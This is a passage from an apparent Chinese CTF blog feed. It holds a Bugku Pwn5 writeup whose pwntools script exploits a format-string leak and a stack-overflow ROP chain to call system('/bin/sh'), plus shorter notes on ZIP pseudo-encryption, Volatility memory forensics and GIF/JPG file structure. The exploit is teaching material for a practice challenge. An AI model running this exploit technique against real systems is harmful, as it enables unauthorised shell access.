          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 海啸杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-Pwn5</title>
      <link href="archives/32/"/>
      <url>archives/32/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>2019年12月15日更新</strong></p><p>学完ROP之后，重新做一下题目。bugku 5道 pwn 挺适合在学完 ROP 之后用来练习的。</p><p><del>网上对 pwn5 的 wp 视乎好像不是太详细，就做一篇比较详细解释的。</del></p><p>或者说是基于<a href="https://blog.csdn.net/kety_gz/article/details/100516666">橘小白</a>wp的补充 XD</p><hr><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>看一下保护，只开了NX。</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NreWVkYWk5MTAvUGljYmVkL21hc3Rlci9pbWcvcHduNS1idWdrdS1jaGVja3NlYy5wbmc?x-oss-process=image/format,png"></p><p>没有危险函数，如system、getshell等</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190903183652137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tldHlfZ3o=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>main 函数中存在两个漏洞。首先是第10行的 printf 存在<strong>格式化字符串漏洞</strong>；其次是17行的 read 存在<strong>栈溢出</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;::s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;amp;s, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;amp;s, &amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;byte_400978);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400998);</span><br><span class="line">  read(<span class="number">0</span>, &amp;amp;s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(&amp;amp;s, &amp;amp;needle) || !<span class="built_in">strstr</span>(&amp;amp;s, &amp;amp;dword_4009BA) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;amp;byte_4009C8);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;byte_4009F8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>18 行的 if 满足条件是第二次输入值含有数组<code>&amp;needle</code>和<code>&amp;dword_4009BA</code>的内容。直接查看变量值(双击变量)是得不到任何字符，因为里面存储的是中文，查看方法应该是选中变量后，打开 ida 的 hex view 窗口，并结合数组存储的十六进制数查看。这里就展示查看 needle：</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NreWVkYWk5MTAvUGljYmVkL21hc3Rlci9pbWcvMjAxOTEyMTUxMTM2NDYucG5n?x-oss-process=image/format,png"></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这道题目首先需要用格式化字符串漏洞泄露存储在 rip 中 __libc_main 的地址，然后利用栈溢出覆写 rip 为 system 地址。</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>要泄露libc，就需要知道 rip 对于指针的偏移位置。而 rip 的偏移可以基于变量 s 的偏移计算出来。那么是需要先找变量 s 的偏移。怎么找，就不再造轮子了，现成<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0">轮子</a>。</p><p>给出查找脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">p = process(&amp;quot;./human&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;aaaa%&#123;&#125;$p&amp;quot;.<span class="built_in">format</span>(n))</span><br><span class="line">recv = p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line"><span class="keyword">if</span> &amp;<span class="comment">#039;61616161&amp;#039; in recv:</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得出 s 偏移为 6。s 与 rbp 的距离是 0x20，那么 rip 的偏移为 11。</p><p>泄露出返回地址后，就需要基于这个地址计算出 system 的地址和 /bin/sh地址。由于题目没有给出 libc.so 文件，那么我们查询程序调用的libc，并复制到目录下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;gt;$ ldd human</span><br><span class="line">linux-vdso.so.1 =&amp;gt;  (0x00007ffff7ffa000)</span><br><span class="line">libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a0d000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">&amp;gt;$ cp /lib/x86_64-linux-gnu/libc.so.6 libc.so</span><br></pre></td></tr></table></figure><p>还要注意一点的是，泄露出来的是<code>__libc_start_main+240</code>，所以计算地址时，需要减去240。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>程序是64位，也就是寄存器传参。我们就利用 ROPgadget 查一下 libc.so 文件中 pop_rdi_ret 的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so --only &amp;quot;pop|ret&amp;quot;</span><br></pre></td></tr></table></figure><p>构造的 payload 需要含有 <code>鸽子</code>、<code>真香</code>，填充长度为 0x28。然后依次 gadget、binsh、system。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移计算</span></span><br><span class="line">&amp;<span class="comment">#039;&amp;#039;&amp;#039;</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">p = process(&amp;quot;./human&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;aaaa%&#123;&#125;$p&amp;quot;.<span class="built_in">format</span>(n))</span><br><span class="line">recv = p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line"><span class="keyword">if</span> &amp;<span class="comment">#039;61616161&amp;#039; in recv:</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line">&amp;<span class="comment">#039;&amp;#039;&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = process(&amp;quot;./human&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;114.116.54.89&amp;quot;, &amp;quot;10005&amp;quot;)</span></span><br><span class="line">elf = ELF(&amp;quot;./human&amp;quot;)</span><br><span class="line">libc = ELF(&amp;quot;./libc.so&amp;quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400933</span> <span class="comment"># ROPgadget查到的地址</span></span><br><span class="line">gezi = &amp;quot;鸽子&amp;quot;</span><br><span class="line">zhenxiang = &amp;quot;真香&amp;quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak __libc_start_main</span></span><br><span class="line">print p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line">p.send(&amp;quot;%<span class="number">11</span>$p&amp;quot;)</span><br><span class="line">main_addr = <span class="built_in">eval</span>(p.recvuntil(&amp;quot;%<span class="number">11</span>$p&amp;quot;,<span class="literal">True</span>))-<span class="number">240</span></span><br><span class="line">log.info(&amp;quot;main_addr = &amp;quot;+<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base_addr</span></span><br><span class="line">libc_addr = main_addr - libc.symbols[&amp;<span class="comment">#039;__libc_start_main&amp;#039;]</span></span><br><span class="line">log.info(&amp;quot;main_addr = &amp;quot;+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak system_addr</span></span><br><span class="line">system_addr = libc_addr + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">log.info(&amp;quot;system_addr = &amp;quot;+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak /bin/sh</span></span><br><span class="line">binsh_addr = libc_addr + libc.search(&amp;quot;/<span class="built_in">bin</span>/sh&amp;quot;).<span class="built_in">next</span>()</span><br><span class="line">log.info(&amp;quot;binsh_addr = &amp;quot;+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow</span></span><br><span class="line">print p.recvuntil(&amp;quot;还有什么本质?&amp;quot;)</span><br><span class="line">payload = (gezi+zhenxiang).ljust(<span class="number">0x20</span>+<span class="number">8</span>,&amp;quot;A&amp;quot;)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NreWVkYWk5MTAvUGljYmVkL21hc3Rlci9pbWcvMjAxOTEyMTUxMjA5MDYucG5n?x-oss-process=image/format,png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/kety_gz/article/details/100516666#commentsedit">BugkuCTF pwn1 pwn2 pwn4 pwn5 pwn3 详细writeup【橘小白】</a></p><p><a href="%5Bhttps://www.mi1k7ea.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%5D(https://www.mi1k7ea.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)">蒸米32位及64位ROP笔记</a></p><p><a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0">格式化字符串漏洞学习</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> ROP </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP压缩包伪加密</title>
      <link href="archives/34/"/>
      <url>archives/34/</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>ZIP文件的16进制文件可以分为<strong>压缩源文件数据区</strong>、<strong>压缩源文件目录区</strong>、<strong>压缩源文件目录结束标志</strong>。</p><p>每个区都有对应的文件头标记，结合实际16进制文件来解释各区的文件头信息。</p><h3 id="压缩源文件数据区"><a href="#压缩源文件数据区" class="headerlink" title="压缩源文件数据区"></a>压缩源文件数据区</h3><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200224162152.png" alt="压缩源文件数据区"></p><table><thead><tr><th align="center">16进制文件数据</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">50 4B 03 04</td><td align="center">zip类型头文件标识</td></tr><tr><td align="center">14 00</td><td align="center">解压文件所需要pkware版本</td></tr><tr><td align="center">00 00</td><td align="center">全局方式位标记（有无加密）</td></tr><tr><td align="center">08 00</td><td align="center">压缩方式</td></tr><tr><td align="center">70 02</td><td align="center">最后修改文件时间</td></tr><tr><td align="center">01 4B</td><td align="center">最后修改文件日期</td></tr><tr><td align="center">B7 EF DC 83</td><td align="center">CRC-32校验（1480B516）</td></tr><tr><td align="center">03 00 00 00</td><td align="center">压缩后尺寸（3B）</td></tr><tr><td align="center">01 00 00 00</td><td align="center">未压缩尺寸（23）</td></tr><tr><td align="center">05 00</td><td align="center">文件名长度</td></tr><tr><td align="center">00 00</td><td align="center">扩展记录长度</td></tr></tbody></table><h3 id="压缩源文件目录区"><a href="#压缩源文件目录区" class="headerlink" title="压缩源文件目录区"></a>压缩源文件目录区</h3><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200224162239.png" alt="压缩源文件目录区"></p><table><thead><tr><th align="center">16进制文件数据</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">50 4B 01 02</td><td align="center">目录中文件文件头标记</td></tr><tr><td align="center">1F 00</td><td align="center">压缩使用的 pkware 版本</td></tr><tr><td align="center">14 00</td><td align="center">解压文件所需 pkware 版本</td></tr><tr><td align="center">00 00</td><td align="center">全局方式位标记（有无加密）</td></tr><tr><td align="center">08 00</td><td align="center">压缩方式</td></tr><tr><td align="center">70 02</td><td align="center">最后修改文件时间</td></tr><tr><td align="center">01 4B</td><td align="center">最后修改文件日期</td></tr><tr><td align="center">B7 EF DC 83</td><td align="center">CRC-32校验（1480B516）</td></tr></tbody></table><h3 id="压缩源文件目录结束标志"><a href="#压缩源文件目录结束标志" class="headerlink" title="压缩源文件目录结束标志"></a>压缩源文件目录结束标志</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/15/6L8p9sxDwemQHUI.png" alt="压缩源文件目录结束标志"></p><table><thead><tr><th align="center">16进制文件数据</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">50 4B 05 06</td><td align="center">目录结束标志</td></tr><tr><td align="center">00 00</td><td align="center">当前磁盘变薄</td></tr><tr><td align="center">00 00</td><td align="center">目录区开始磁盘编号</td></tr><tr><td align="center">01 00</td><td align="center">本磁盘上记录总数</td></tr><tr><td align="center">01 00</td><td align="center">目录区中记录总数</td></tr><tr><td align="center">81 00 00 00</td><td align="center">目录区尺寸大小</td></tr><tr><td align="center">50 00 00 00</td><td align="center">目录区对第一张磁盘的偏移量</td></tr><tr><td align="center">00 00</td><td align="center">ZIP文件注释长度</td></tr></tbody></table><h2 id="伪加密原理"><a href="#伪加密原理" class="headerlink" title="伪加密原理"></a>伪加密原理</h2><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</p><h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>00 00</code></p><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>新建一个文件，压缩为一个无密码的后缀名为zip的包。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/15/5NObJMkrma3PpIV.png"></p><p>用winhex打开找到<strong>压缩源文件目录区</strong>，找到全局方式位修改为<code>09 00</code>。尝试解压文件会提示输入秘密。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/15/TpdSQ5XtU1hDy6L.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://blog.csdn.net/ETF6996/article/details/51946250">zip伪加密</a></p></li><li><p><a href="https://blog.csdn.net/kajweb/article/details/76474476">[CTF]zip伪加密</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪加密 </tag>
            
            <tag> ZIP压缩包 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证-volatility</title>
      <link href="archives/ef33b88f/"/>
      <url>archives/ef33b88f/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证-volatility"><a href="#内存取证-volatility" class="headerlink" title="内存取证-volatility"></a>内存取证-volatility</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>实测kali 7.x自带，而最新的kali 9.x没有</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>判断镜像信息，获取操作系统类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img&#x2F;raw&#x2F;... imageinfo</span><br></pre></td></tr></table></figure><p>知道操作系统类型后，用<code>--profile</code>指定系统的操作类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img --profile&#x3D;...</span><br></pre></td></tr></table></figure><p>查看当前显示的notepad文本（提取某个程序）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 notepad</span><br></pre></td></tr></table></figure><p>查看当前运行的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 psscan&#x2F;pslist</span><br></pre></td></tr></table></figure><p>扫描所有的文件列表(常常结合grep，即正则)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 filescan</span><br></pre></td></tr></table></figure><p>根据offset提取出文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 dumpfiles -D . -Q 0x.....</span><br></pre></td></tr></table></figure><p>扫描 Windows 的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile&#x3D;WinXPSP2x86 svcscan</span><br></pre></td></tr></table></figure><p>查看网络连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile&#x3D;WinXPSP2x86 connscan</span><br></pre></td></tr></table></figure><p>查看命令行上的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile&#x3D;WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p>根据pid dump出相应的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 memdump -p 2580 -D 目录</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://coomrade.github.io/2018/10/27/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E4%B9%8B%E6%97%85/">内存取证之旅</a></p><p><a href="http://shaobaobaoer.cn/archives/693/memory-forensics-tool-volatility-usage-and-practice">内存取证工具volatility用法与实战</a>（ps:这个含手动安装）</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 文件结构 </tag>
            
            <tag> volatility </tag>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件结构</title>
      <link href="archives/2d3e394e/"/>
      <url>archives/2d3e394e/</url>
      
        <content type="html"><![CDATA[<h1 id="图片的结构"><a href="#图片的结构" class="headerlink" title="图片的结构"></a>图片的结构</h1><h2 id="Gif"><a href="#Gif" class="headerlink" title="Gif"></a>Gif</h2><p>一个GIF文件的结构可分为文件头(File Header)、GIF数据流(GIF Data Stream)和文件终结器(Trailer)三个部分。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/ku6YQBKoUZEO4Am.png"></p><h3 id="文件头部分"><a href="#文件头部分" class="headerlink" title="文件头部分"></a>文件头部分</h3><h4 id="GIF署名-Signature-和版本号-Version"><a href="#GIF署名-Signature-和版本号-Version" class="headerlink" title="GIF署名(Signature)和版本号(Version)"></a>GIF署名(Signature)和版本号(Version)</h4><p>GIF署名用来确认一个文件是否是GIF格式的文件，这一部分由三个字符组成：”GIF”;文件版本号也是由三个字节组成,可以为”87a”或”89a”.具体描述见下表:</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/UWynx68w9GF5Da3.png"></p><p>对应到实际文件中：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/iGCJLm28AMYRqlT.png"></p><h3 id="GIF数据流部分-GIF-Data-Stream"><a href="#GIF数据流部分-GIF-Data-Stream" class="headerlink" title="GIF数据流部分(GIF Data Stream)"></a>GIF数据流部分(GIF Data Stream)</h3><blockquote><p>这部分不是按照顺序记录，详细顺序参照上面的Gif总结构表</p></blockquote><h4 id="图象标识符-Image-Descriptor"><a href="#图象标识符-Image-Descriptor" class="headerlink" title="图象标识符(Image Descriptor)"></a>图象标识符(Image Descriptor)</h4><p>一个GIF文件内可以包含多幅图象，一幅图象结束之后紧接着下是一幅图象的标识符，图象标识符以0x2C(‘,’)字符开始，定义紧接着它的图象的性质，包括图象相对于逻辑屏幕边界的偏移量、图象大小以及有无局部颜色列表和颜色列表大小，由10个字节组成：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/JbsgufniGTqUhPr.png"></p><h4 id="注释扩展-Comment-Extension"><a href="#注释扩展-Comment-Extension" class="headerlink" title="注释扩展(Comment Extension)"></a>注释扩展(Comment Extension)</h4><p>这一部分是可选的（需要89a版本），可以用来记录图形、版权、描述等任何的非图形和控制的纯文本数据(7-bit ASCII字符)，注释扩展并不影响对图象数据流的处理，解码器完全可以忽略它。存放位置可以是数据流的任何地方，最好不要妨碍控制和数据块，推荐放在数据流的开始或结尾。具体组成：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/U2PsuDjkFRf4hLo.png"></p><h3 id="文件结尾部分"><a href="#文件结尾部分" class="headerlink" title="文件结尾部分"></a>文件结尾部分</h3><h4 id="文件终结器-Trailer"><a href="#文件终结器-Trailer" class="headerlink" title="文件终结器(Trailer)"></a>文件终结器(Trailer)</h4><p>这一部分只有一个值为0的字节，标识一个GIF文件结束.</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/jX14qWyA9fb5had.png"></p><p>对应到实际中：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/iVbd3kKon98lXst.png"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li>[Gif文档](<a href="https://dev.gameres.com/Program/Visual/Other">https://dev.gameres.com/Program/Visual/Other</a> /GIFDoc.htm)</li></ul><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG/JPEG内部存储是块状类型（即文件内部分为若干块），这些块由ff开头，ff后紧跟的一个标记符指明了这个块的类型。</p><p>JPEG (jpg) 文件头：FFD8FF文件尾：FF D9</p><p>这些分块按出现顺序分别是：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/AUj2Ynf67eTxt1K.png"></p><h3 id="文件开始-amp-结束"><a href="#文件开始-amp-结束" class="headerlink" title="文件开始&amp;结束"></a>文件开始&amp;结束</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/LH1hAqaKdVjku2l.png"></p><h3 id="FFE0-APP0-图像识别信息"><a href="#FFE0-APP0-图像识别信息" class="headerlink" title="FFE0 APP0 图像识别信息"></a>FFE0 APP0 图像识别信息</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/jWft1e5MuJNKBwh.png"></p><ul><li>FFE0：定义交换格式和图像识别信息</li><li>4a46 4946 00：JFIF格式标识符</li><li>01 01：版本号（第一个01是主版本好，第二个01是次版本号）</li><li>01：单位（00=无单位；01=点数/英寸；02=点数/厘米）</li><li>0078：为水平分辨率</li><li>0078：为竖直分辨率</li><li>00：水平点数</li><li>00：竖直点数</li></ul><h3 id="TIPs"><a href="#TIPs" class="headerlink" title="TIPs"></a>TIPs</h3><ul><li>jpg文件缺少文件尾在windows下也能被正确打开。（bugku中的这是一张单纯的图片）</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/blues1021/article/details/45422557">JPG文件格式初步认识</a></li><li><a 